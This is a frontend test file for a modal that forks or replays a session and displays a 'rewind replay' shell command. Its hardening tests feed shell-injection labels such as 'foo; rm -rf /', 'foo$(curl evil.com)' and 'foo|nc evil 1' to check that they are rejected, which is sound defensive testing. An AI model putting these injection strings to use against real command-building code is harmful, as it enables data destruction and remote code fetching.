import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { render, screen, fireEvent, waitFor } from '@testing-library/react'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { ForkReplayModal } from './ForkReplayModal'
import { api } from '@/lib/api'
import { useStore } from '@/hooks/use-store'

vi.mock('@/lib/api', () => ({
  api: { forkSession: vi.fn() },
}))

function wrap(ui: React.ReactElement) {
  const client = new QueryClient({
    defaultOptions: { queries: { retry: false } },
  })
  return render(<QueryClientProvider client={client}>{ui}</QueryClientProvider>)
}

const originalClipboard = navigator.clipboard

beforeEach(() => {
  vi.clearAllMocks()
  useStore.setState({ selectedTimelineId: null })
})

afterEach(() => {
  useStore.setState({ selectedTimelineId: null })
  // Restore the original clipboard descriptor so tests that mutate it don't
  // leak into other tests via the shared navigator global.
  if (originalClipboard) {
    Object.assign(navigator, { clipboard: originalClipboard })
  } else {
    delete (navigator as unknown as { clipboard?: unknown }).clipboard
  }
})

describe('ForkReplayModal', () => {
  it('does not render when closed', () => {
    wrap(
      <ForkReplayModal
        isOpen={false}
        onClose={() => {}}
        mode="fork"
        sessionId="s1"
        atStep={3}
      />,
    )
    expect(screen.queryByRole('dialog')).not.toBeInTheDocument()
  })

  it('does not render when atStep is null, even if isOpen is true', () => {
    wrap(
      <ForkReplayModal
        isOpen={true}
        onClose={() => {}}
        mode="fork"
        sessionId="s1"
        atStep={null}
      />,
    )
    expect(screen.queryByRole('dialog')).not.toBeInTheDocument()
  })

  it('defaults label to fork-at-{N} and shows the step number', () => {
    wrap(
      <ForkReplayModal
        isOpen={true}
        onClose={() => {}}
        mode="fork"
        sessionId="s1"
        atStep={7}
      />,
    )
    const input = screen.getByRole('textbox') as HTMLInputElement
    expect(input.value).toBe('fork-at-7')
    expect(screen.getByText(/Fork from step #7/)).toBeInTheDocument()
  })

  it('submits fork, selects the new timeline, and closes on success', async () => {
    const forkMock = vi.mocked(api.forkSession)
    forkMock.mockResolvedValue({ fork_timeline_id: 'new-tl-1' })
    const onClose = vi.fn()

    wrap(
      <ForkReplayModal
        isOpen={true}
        onClose={onClose}
        mode="fork"
        sessionId="s1"
        timelineId="root-tl"
        atStep={4}
      />,
    )

    fireEvent.click(screen.getByRole('button', { name: /create fork/i }))

    await waitFor(() => expect(forkMock).toHaveBeenCalledWith('s1', {
      at_step: 4,
      label: 'fork-at-4',
      timeline_id: 'root-tl',
    }))
    await waitFor(() => expect(onClose).toHaveBeenCalled())
    expect(useStore.getState().selectedTimelineId).toBe('new-tl-1')
  })

  it('shows error when fork fails and keeps the modal open', async () => {
    const forkMock = vi.mocked(api.forkSession)
    forkMock.mockRejectedValue(new Error('API error 400: bad step'))
    const onClose = vi.fn()

    wrap(
      <ForkReplayModal
        isOpen={true}
        onClose={onClose}
        mode="fork"
        sessionId="s1"
        atStep={4}
      />,
    )

    fireEvent.click(screen.getByRole('button', { name: /create fork/i }))

    await waitFor(() => expect(screen.getByText(/bad step/)).toBeInTheDocument())
    expect(onClose).not.toHaveBeenCalled()
    expect(useStore.getState().selectedTimelineId).toBeNull()
  })

  it('uses trimmed default label when input is cleared', async () => {
    const forkMock = vi.mocked(api.forkSession)
    forkMock.mockResolvedValue({ fork_timeline_id: 'new-tl-2' })

    wrap(
      <ForkReplayModal
        isOpen={true}
        onClose={() => {}}
        mode="fork"
        sessionId="s1"
        atStep={2}
      />,
    )

    const input = screen.getByRole('textbox') as HTMLInputElement
    fireEvent.change(input, { target: { value: '   ' } })
    fireEvent.click(screen.getByRole('button', { name: /create fork/i }))

    await waitFor(() => expect(forkMock).toHaveBeenCalledWith('s1', {
      at_step: 2,
      label: 'fork-at-2',
      timeline_id: undefined,
    }))
  })
})

describe('ForkReplayModal — replay mode', () => {
  it('defaults label to replay-from-{N} and titles the modal accordingly', () => {
    wrap(
      <ForkReplayModal
        isOpen={true}
        onClose={() => {}}
        mode="replay"
        sessionId="abcdef12-3456"
        atStep={3}
      />,
    )
    const input = screen.getByRole('textbox') as HTMLInputElement
    expect(input.value).toBe('replay-from-3')
    expect(screen.getByText(/Set up replay from step #3/)).toBeInTheDocument()
    expect(screen.getByRole('button', { name: /set up replay/i })).toBeInTheDocument()
  })

  it('after fork succeeds, shows instructions with the rewind replay command and does NOT navigate', async () => {
    const forkMock = vi.mocked(api.forkSession)
    forkMock.mockResolvedValue({ fork_timeline_id: 'tl-replay-1' })
    const onClose = vi.fn()

    wrap(
      <ForkReplayModal
        isOpen={true}
        onClose={onClose}
        mode="replay"
        sessionId="abcdef1234567890"
        atStep={4}
      />,
    )

    fireEvent.click(screen.getByRole('button', { name: /set up replay/i }))

    await waitFor(() => expect(forkMock).toHaveBeenCalled())

    // Instructions panel renders the CLI command, uses an 8-char session-id prefix
    // (matches MCP tool format), includes the step number and label.
    const cmdElement = await screen.findByText(/rewind replay abcdef12 --from 4 --label replay-from-4/)
    expect(cmdElement).toBeInTheDocument()

    // Cached-steps explainer is present (matches MCP's `message` format).
    expect(screen.getByText(/Steps 1–4 replay from cache/i)).toBeInTheDocument()

    // Modal stays open until the user dismisses; do NOT auto-close or navigate.
    expect(onClose).not.toHaveBeenCalled()
    expect(useStore.getState().selectedTimelineId).toBeNull()
  })

  it('Copy button writes the command to the clipboard', async () => {
    const forkMock = vi.mocked(api.forkSession)
    forkMock.mockResolvedValue({ fork_timeline_id: 'tl-replay-2' })

    const writeText = vi.fn().mockResolvedValue(undefined)
    Object.assign(navigator, { clipboard: { writeText } })

    wrap(
      <ForkReplayModal
        isOpen={true}
        onClose={() => {}}
        mode="replay"
        sessionId="deadbeefcafebabe"
        atStep={2}
      />,
    )
    fireEvent.click(screen.getByRole('button', { name: /set up replay/i }))

    const copyBtn = await screen.findByRole('button', { name: /copy/i })
    fireEvent.click(copyBtn)

    await waitFor(() => expect(writeText).toHaveBeenCalledWith(
      'rewind replay deadbeef --from 2 --label replay-from-2',
    ))
  })

  it('Done button closes the modal and navigates to the new fork', async () => {
    const forkMock = vi.mocked(api.forkSession)
    forkMock.mockResolvedValue({ fork_timeline_id: 'tl-replay-3' })
    const onClose = vi.fn()

    wrap(
      <ForkReplayModal
        isOpen={true}
        onClose={onClose}
        mode="replay"
        sessionId="sess123456"
        atStep={1}
      />,
    )
    fireEvent.click(screen.getByRole('button', { name: /set up replay/i }))
    const done = await screen.findByRole('button', { name: /^done$/i })
    fireEvent.click(done)

    expect(onClose).toHaveBeenCalled()
    expect(useStore.getState().selectedTimelineId).toBe('tl-replay-3')
  })

  it('shows error and stays on the input state when fork fails', async () => {
    const forkMock = vi.mocked(api.forkSession)
    forkMock.mockRejectedValue(new Error('API error 400: bad step'))

    wrap(
      <ForkReplayModal
        isOpen={true}
        onClose={() => {}}
        mode="replay"
        sessionId="sess999"
        atStep={5}
      />,
    )
    fireEvent.click(screen.getByRole('button', { name: /set up replay/i }))
    await waitFor(() => expect(screen.getByText(/bad step/)).toBeInTheDocument())
    // Still on the input state — the Set-up-replay primary button is there.
    expect(screen.getByRole('button', { name: /set up replay/i })).toBeInTheDocument()
    expect(screen.queryByText(/rewind replay/)).not.toBeInTheDocument()
  })
})

describe('ForkReplayModal — polish & hardening', () => {
  // CRITICAL-1 from Santa review: shell injection via label.
  it.each([
    ['semicolon', 'foo; rm -rf /'],
    ['backtick', 'foo`whoami`'],
    ['dollar-paren', 'foo$(curl evil.com)'],
    ['pipe', 'foo|nc evil 1'],
    ['ampersand', 'foo && bad'],
    ['space', 'foo bar'],
    ['quote', "foo'bar"],
  ])('rejects label with %s and disables submit', (_name, badLabel) => {
    wrap(
      <ForkReplayModal
        isOpen={true}
        onClose={() => {}}
        mode="fork"
        sessionId="s1"
        atStep={3}
      />,
    )
    const input = screen.getByRole('textbox') as HTMLInputElement
    fireEvent.change(input, { target: { value: badLabel } })

    const submit = screen.getByRole('button', { name: /create fork/i }) as HTMLButtonElement
    expect(submit.disabled).toBe(true)
    // Inline error explains *why* — specific, not just "invalid".
    expect(screen.getByText(/letters, numbers/i)).toBeInTheDocument()
  })

  it('accepts labels with letters, digits, dash, dot, underscore', () => {
    wrap(
      <ForkReplayModal
        isOpen={true}
        onClose={() => {}}
        mode="fork"
        sessionId="s1"
        atStep={3}
      />,
    )
    const input = screen.getByRole('textbox') as HTMLInputElement
    fireEvent.change(input, { target: { value: 'my-fork_v2.1' } })
    const submit = screen.getByRole('button', { name: /create fork/i }) as HTMLButtonElement
    expect(submit.disabled).toBe(false)
    expect(screen.queryByText(/letters, numbers/i)).not.toBeInTheDocument()
  })

  it('never calls forkSession when label is invalid, even if handler runs', async () => {
    const forkMock = vi.mocked(api.forkSession)
    wrap(
      <ForkReplayModal
        isOpen={true}
        onClose={() => {}}
        mode="fork"
        sessionId="s1"
        atStep={3}
      />,
    )
    const input = screen.getByRole('textbox') as HTMLInputElement
    fireEvent.change(input, { target: { value: 'bad; rm' } })
    // Submit button is disabled; simulate a "force-click" by pressing Enter on the input.
    fireEvent.submit(input.closest('form') ?? input)
    // Give any promises a tick.
    await Promise.resolve()
    expect(forkMock).not.toHaveBeenCalled()
  })

  // Important-2: focus management on phase transition.
  it('moves focus to the Done button after switching to instructions', async () => {
    const forkMock = vi.mocked(api.forkSession)
    forkMock.mockResolvedValue({ fork_timeline_id: 'tl-focus' })

    wrap(
      <ForkReplayModal
        isOpen={true}
        onClose={() => {}}
        mode="replay"
        sessionId="focus-session-id"
        atStep={2}
      />,
    )
    fireEvent.click(screen.getByRole('button', { name: /set up replay/i }))

    const done = await screen.findByRole('button', { name: /^done$/i })
    await waitFor(() => expect(done).toHaveFocus())
  })

  it('announces success banner with aria-live=polite', async () => {
    const forkMock = vi.mocked(api.forkSession)
    forkMock.mockResolvedValue({ fork_timeline_id: 'tl-aria' })

    wrap(
      <ForkReplayModal
        isOpen={true}
        onClose={() => {}}
        mode="replay"
        sessionId="sess-aria"
        atStep={1}
      />,
    )
    fireEvent.click(screen.getByRole('button', { name: /set up replay/i }))
    const alert = await screen.findByRole('status')
    expect(alert).toHaveAttribute('aria-live', 'polite')
    expect(alert.textContent).toMatch(/Fork created/)
  })

  // Important-1: setTimeout leak in handleCopy.
  it('does not call setState after the modal closes with the Copied timer pending', async () => {
    vi.useFakeTimers()
    const forkMock = vi.mocked(api.forkSession)
    forkMock.mockResolvedValue({ fork_timeline_id: 'tl-timer' })

    const writeText = vi.fn().mockResolvedValue(undefined)
    Object.assign(navigator, { clipboard: { writeText } })

    // Spy on console.error — React will log an unmounted-setState warning if
    // the cleanup is missing. We assert silence; this catches the regression.
    const errSpy = vi.spyOn(console, 'error').mockImplementation(() => {})

    const { unmount } = wrap(
      <ForkReplayModal
        isOpen={true}
        onClose={() => {}}
        mode="replay"
        sessionId="timer-test"
        atStep={1}
      />,
    )
    fireEvent.click(screen.getByRole('button', { name: /set up replay/i }))
    // Await the fork POST to resolve. Use real promise microtask pump.
    await vi.waitFor(() => screen.findByRole('button', { name: /copy/i }))
    fireEvent.click(screen.getByRole('button', { name: /copy/i }))
    // writeText is async → flush microtasks so setCopied(true) + setTimeout land.
    await Promise.resolve()
    await Promise.resolve()

    unmount()
    // Advance past the 2s Copied reset; a leaked setTimeout would fire here.
    vi.advanceTimersByTime(3000)

    const unmountedSetStateWarnings = errSpy.mock.calls.filter((args) =>
      String(args[0]).includes('unmounted component') ||
      String(args[0]).includes("can't perform a React state update"),
    )
    expect(unmountedSetStateWarnings).toHaveLength(0)

    errSpy.mockRestore()
    vi.useRealTimers()
  })
})
